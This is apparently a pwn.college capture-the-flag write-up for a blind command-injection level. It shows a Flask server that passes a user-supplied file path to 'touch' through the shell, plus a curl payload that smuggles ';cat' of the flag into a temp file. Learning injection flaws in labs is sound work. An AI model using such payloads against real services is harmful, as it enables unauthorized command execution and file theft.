@@ -1,0 +1,51 @@
+#CMDi 5
+#挑战简介
+Programs tend to shell out to do complex internal computation. This means that you might not always get sent the resulting output, 
+and you will need to do your attack blind. Try it in this level: without the output of your injected command, get the flag!
+
+#cat /challenge/server
+#!/opt/pwn.college/python
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+@app.route("/", methods=["GET", "POST"])
+def challenge():
+    filepath = flask.request.args.get("filepath", "/challenge")
+    command = f"touch {filepath}"
+    print(f"DEBUG: {command=}")
+    subprocess.run(
+        command,                    # the command to run
+        shell=True,                 # use the shell to run this command
+        stdout=subprocess.PIPE,     # capture the standard output
+        stderr=subprocess.STDOUT,   # 2>&1
+        encoding="latin"            # capture the resulting output as text
+    )
+
+    return f"""
+        <html><body>
+        Welcome to the touch service! Please choose a file to touch:
+        <form><input type=text name=filepath><input type=submit value=Submit></form>
+        <hr>
+        <b>Ran the command: touch {filepath}</b>
+        </body></html>
+        """
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+port = 8080 if os.geteuid() else 80
+app.config['SERVER_NAME'] = f"challenge.localhost:{port}"
+app.run("challenge.localhost", port)
+
+#思路: value变成了filepath，命令改成了touch，我们可以运用touch创建一个/tmp/flag下的flag文件，用;cat来进行进一步操作
+#注意运用'>'，把/flag的内容写进另一个/tmp/目录下的flag，再进行读写更保障
+curl -v "http://challenge.localhost/?filepath=/tmp/flag%3Bcat%20/challenge/../flag%20>%20/tmp/flag"
+#respond
+<b>Ran the command: touch /tmp/flag;cat /challenge/../flag > /tmp/flag</b>
+
+#bash
+cat /tmp/flag
